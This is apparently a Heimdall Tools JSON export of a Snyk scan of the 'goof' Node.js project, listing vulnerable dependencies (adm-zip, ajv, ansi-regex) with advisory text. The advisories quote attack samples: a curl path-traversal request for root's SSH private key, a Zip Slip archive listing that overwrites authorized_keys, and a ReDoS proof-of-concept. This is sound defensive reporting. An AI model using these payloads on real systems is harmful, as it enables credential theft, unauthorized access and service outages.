{
  "platform": {
    "name": "Heimdall Tools",
    "release": "2.6.29",
    "target_id": "goof"
  },
  "version": "2.6.29",
  "statistics": {
    "duration": null
  },
  "profiles": [
    {
      "name": "Snyk Scan",
      "title": "Snyk Project: goof Snyk Path: .\\nodejs-goof\\",
      "maintainer": null,
      "summary": "Snyk Summary: 379 vulnerable dependency paths",
      "license": null,
      "copyright": null,
      "copyright_email": null,
      "supports": [],
      "attributes": [],
      "depends": [],
      "groups": [],
      "status": "loaded",
      "controls": [
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "22"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Directory Traversal",
          "id": "SNYK-JS-ADMZIP-1065796",
          "desc": "## Overview\n[adm-zip](https://www.npmjs.com/package/adm-zip) is a JavaScript implementation for zip data compression for NodeJS.\n\nAffected versions of this package are vulnerable to Directory Traversal. It could extract files outside the target folder.\n\n## Details\n\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\n\nDirectory Traversal vulnerabilities can be generally divided into two types:\n\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\n\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\n\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\n\n```\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\n```\n**Note** `%2e` is the URL encoded version of `.` (dot).\n\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \n\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n2018-04-15 22:04:29 .....           19           19  good.txt\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\n```\n\n## Remediation\nUpgrade `adm-zip` to version 0.5.2 or higher.\n## References\n- [GitHub Commit](https://github.com/cthackers/adm-zip/commit/119dcad6599adccc77982feb14a0c7440fa63013)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-01-28T07:59:50.454879Z\",\n  \"credit\": [\n    \"cthackers\"\n  ],\n  \"cvssScore\": 7.4,\n  \"description\": \"## Overview\\n[adm-zip](https://www.npmjs.com/package/adm-zip) is a JavaScript implementation for zip data compression for NodeJS.\\n\\nAffected versions of this package are vulnerable to Directory Traversal. It could extract files outside the target folder.\\n\\n## Details\\n\\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \\\"dot-dot-slash (../)\\\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\\n\\nDirectory Traversal vulnerabilities can be generally divided into two types:\\n\\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\\n\\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\\n\\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\\n\\n```\\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\\n```\\n**Note** `%2e` is the URL encoded version of `.` (dot).\\n\\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \\n\\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\\n\\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\\n\\n```\\n2018-04-15 22:04:29 .....           19           19  good.txt\\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\\n```\\n\\n## Remediation\\nUpgrade `adm-zip` to version 0.5.2 or higher.\\n## References\\n- [GitHub Commit](https://github.com/cthackers/adm-zip/commit/119dcad6599adccc77982feb14a0c7440fa63013)\\n\",\n  \"disclosureTime\": \"2021-01-28T07:59:22Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"0.5.2\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-ADMZIP-1065796\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-22\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-02-15T17:04:18.111270Z\",\n  \"moduleName\": \"adm-zip\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"adm-zip\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2021-02-15T17:04:18.109270Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/cthackers/adm-zip/commit/119dcad6599adccc77982feb14a0c7440fa63013\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<0.5.2\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Directory Traversal\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"adm-zip@0.4.7\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"adm-zip@0.5.2\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"adm-zip\",\n  \"version\": \"0.4.7\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , adm-zip@0.4.7 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "29"
            ],
            "cveid": [
              "2018-1002204"
            ],
            "ghsaid": [
              "3v6h-hqm4-2rg6"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Arbitrary File Write via Archive Extraction (Zip Slip)",
          "id": "npm:adm-zip:20180415",
          "desc": "## Overview\n\n[adm-zip](https://www.npmjs.com/package/adm-zip) is a JavaScript implementation for zip data compression for NodeJS.\n\n\nAffected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip).\n\n## Details\nIt is exploited using a specially crafted zip archive, that holds path traversal filenames. When exploited, a filename in a malicious archive is concatenated to the target extraction directory, which results in the final path ending up outside of the target folder. For instance, a zip may hold a file with a \"../../file.exe\" location and thus break out of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\r\n\r\nThe following is an example of a zip archive with one benign file and one malicious file. Extracting the malicous file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\r\n\r\n```\r\n\r\n+2018-04-15 22:04:29 ..... 19 19 good.txt\r\n\r\n+2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys\r\n\r\n```\n\n## Remediation\n\nUpgrade `adm-zip` to version 0.4.11 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/cthackers/adm-zip/commit/d01fa8c80c3a5fcf5ce1eda82d96600c62910d3f)\n\n- [GitHub Commit](https://github.com/cthackers/adm-zip/pull/212/commits/6f4dfeb9a2166e93207443879988f97d88a37cde)\n\n- [Hackerone Report](https://hackerone.com/reports/362118)\n\n- [Zip Slip Advisory](https://github.com/snyk/zip-slip-vulnerability)\n\n- [Zip Slip Advisory](https://snyk.io/research/zip-slip-vulnerability)\n",
          "impact": 0,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:H/E:H/RL:O/RC:C\",\n  \"alternativeIds\": [\n    \"SNYK-JS-ADMZIP-11093\"\n  ],\n  \"creationTime\": \"2018-05-30T12:09:16.138000Z\",\n  \"credit\": [\n    \"Snyk Security Research\",\n    \"Sébastien Mignot\",\n    \"Alex Chapman\"\n  ],\n  \"cvssScore\": 9.4,\n  \"description\": \"## Overview\\n\\n[adm-zip](https://www.npmjs.com/package/adm-zip) is a JavaScript implementation for zip data compression for NodeJS.\\n\\n\\nAffected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip).\\n\\n## Details\\nIt is exploited using a specially crafted zip archive, that holds path traversal filenames. When exploited, a filename in a malicious archive is concatenated to the target extraction directory, which results in the final path ending up outside of the target folder. For instance, a zip may hold a file with a \\\"../../file.exe\\\" location and thus break out of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\\r\\n\\r\\nThe following is an example of a zip archive with one benign file and one malicious file. Extracting the malicous file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\\r\\n\\r\\n```\\r\\n\\r\\n+2018-04-15 22:04:29 ..... 19 19 good.txt\\r\\n\\r\\n+2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys\\r\\n\\r\\n```\\n\\n## Remediation\\n\\nUpgrade `adm-zip` to version 0.4.11 or higher.\\n\\n\\n## References\\n\\n- [GitHub Commit](https://github.com/cthackers/adm-zip/commit/d01fa8c80c3a5fcf5ce1eda82d96600c62910d3f)\\n\\n- [GitHub Commit](https://github.com/cthackers/adm-zip/pull/212/commits/6f4dfeb9a2166e93207443879988f97d88a37cde)\\n\\n- [Hackerone Report](https://hackerone.com/reports/362118)\\n\\n- [Zip Slip Advisory](https://github.com/snyk/zip-slip-vulnerability)\\n\\n- [Zip Slip Advisory](https://snyk.io/research/zip-slip-vulnerability)\\n\",\n  \"disclosureTime\": \"2018-04-14T21:00:00Z\",\n  \"exploit\": \"High\",\n  \"fixedIn\": [\n    \"0.4.11\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"adm-zip.js\",\n        \"functionName\": \"module.exports.getEntry\"\n      },\n      \"version\": [\n        \">0.1.1 <0.4.11\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"adm-zip.js\",\n        \"functionName\": \"module.exports.getEntry\"\n      },\n      \"version\": [\n        \">0.1.1 <0.4.11\"\n      ]\n    }\n  ],\n  \"id\": \"npm:adm-zip:20180415\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-ADMZIP-11093\"\n    ],\n    \"CVE\": [\n      \"CVE-2018-1002204\"\n    ],\n    \"CWE\": [\n      \"CWE-29\"\n    ],\n    \"GHSA\": [\n      \"GHSA-3v6h-hqm4-2rg6\"\n    ],\n    \"NSP\": [\n      \"994\",\n      \"681\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-22T17:02:11.882075Z\",\n  \"moduleName\": \"adm-zip\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"adm-zip\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2018-05-31T07:09:16Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/cthackers/adm-zip/commit/d01fa8c80c3a5fcf5ce1eda82d96600c62910d3f\"\n    },\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/cthackers/adm-zip/pull/212/commits/6f4dfeb9a2166e93207443879988f97d88a37cde\"\n    },\n    {\n      \"title\": \"Hackerone Report\",\n      \"url\": \"https://hackerone.com/reports/362118\"\n    },\n    {\n      \"title\": \"Zip Slip Advisory\",\n      \"url\": \"https://github.com/snyk/zip-slip-vulnerability\"\n    },\n    {\n      \"title\": \"Zip Slip Advisory\",\n      \"url\": \"https://snyk.io/research/zip-slip-vulnerability\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<0.4.11\"\n    ]\n  },\n  \"severity\": \"critical\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Arbitrary File Write via Archive Extraction (Zip Slip)\",\n  \"severityWithCritical\": \"critical\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"adm-zip@0.4.7\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"adm-zip@0.4.11\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"adm-zip\",\n  \"version\": \"0.4.7\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , adm-zip@0.4.7 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2020-15366"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-AJV-584908",
          "desc": "## Overview\n[ajv](https://www.npmjs.com/package/ajv) is an Another JSON Schema Validator\n\nAffected versions of this package are vulnerable to Prototype Pollution. A carefully crafted JSON schema could be provided that allows execution of other code by prototype pollution. (While untrusted schemas are recommended against, the worst case of an untrusted schema should be a denial of service, not execution of code.)\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `ajv` to version 6.12.3 or higher.\n## References\n- [HackerOne Report](https://hackerone.com/bugs?subject=user&report_id=894259)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-07-16T08:19:48.462528Z\",\n  \"credit\": [\n    \"Unknown\"\n  ],\n  \"cvssScore\": 8.1,\n  \"description\": \"## Overview\\n[ajv](https://www.npmjs.com/package/ajv) is an Another JSON Schema Validator\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. A carefully crafted JSON schema could be provided that allows execution of other code by prototype pollution. (While untrusted schemas are recommended against, the worst case of an untrusted schema should be a denial of service, not execution of code.)\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `ajv` to version 6.12.3 or higher.\\n## References\\n- [HackerOne Report](https://hackerone.com/bugs?subject=user&report_id=894259)\\n\",\n  \"disclosureTime\": \"2020-07-16T08:14:41Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"6.12.3\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-AJV-584908\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2020-15366\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-07-20T12:40:09.463832Z\",\n  \"moduleName\": \"ajv\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"ajv\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2020-07-16T13:58:04Z\",\n  \"references\": [\n    {\n      \"title\": \"HackerOne Report\",\n      \"url\": \"https://hackerone.com/bugs?subject=user&report_id=894259\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<6.12.3\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"tap@11.1.5\",\n    \"coveralls@3.0.9\",\n    \"request@2.88.0\",\n    \"har-validator@5.1.3\",\n    \"ajv@6.10.2\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"tap@11.1.5\",\n    \"coveralls@3.0.9\",\n    \"request@2.88.0\",\n    \"har-validator@5.1.3\",\n    \"ajv@6.12.3\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"ajv\",\n  \"version\": \"6.10.2\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , coveralls@3.0.9 , request@2.88.0 , har-validator@5.1.3 , ajv@6.10.2 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2021-3807"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "SNYK-JS-ANSIREGEX-1583908",
          "desc": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the sub-patterns` [[\\\\]()#;?]*` and `(?:;[-a-zA-Z\\\\d\\\\/#&.:=?%@~_]*)*`.\r\n\r\n\r\n### PoC\r\n```js\r\nimport ansiRegex from 'ansi-regex';\r\n\r\nfor(var i = 1; i <= 50000; i++) {\r\n    var time = Date.now();\r\n    var attack_str = \"\\u001B[\"+\";\".repeat(i*10000);\r\n    ansiRegex().test(attack_str)\r\n    var time_cost = Date.now() - time;\r\n    console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\r\n}\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `ansi-regex` to version 6.0.1, 5.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/chalk/ansi-regex/commit/8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9)\n- [GitHub PR](https://github.com/chalk/ansi-regex/pull/37)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-09-09T14:28:31.617043Z\",\n  \"credit\": [\n    \"Yeting Li\"\n  ],\n  \"cvssScore\": 7.5,\n  \"description\": \"## Overview\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the sub-patterns` [[\\\\\\\\]()#;?]*` and `(?:;[-a-zA-Z\\\\\\\\d\\\\\\\\/#&.:=?%@~_]*)*`.\\r\\n\\r\\n\\r\\n### PoC\\r\\n```js\\r\\nimport ansiRegex from 'ansi-regex';\\r\\n\\r\\nfor(var i = 1; i <= 50000; i++) {\\r\\n    var time = Date.now();\\r\\n    var attack_str = \\\"\\\\u001B[\\\"+\\\";\\\".repeat(i*10000);\\r\\n    ansiRegex().test(attack_str)\\r\\n    var time_cost = Date.now() - time;\\r\\n    console.log(\\\"attack_str.length: \\\" + attack_str.length + \\\": \\\" + time_cost+\\\" ms\\\")\\r\\n}\\r\\n```\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must 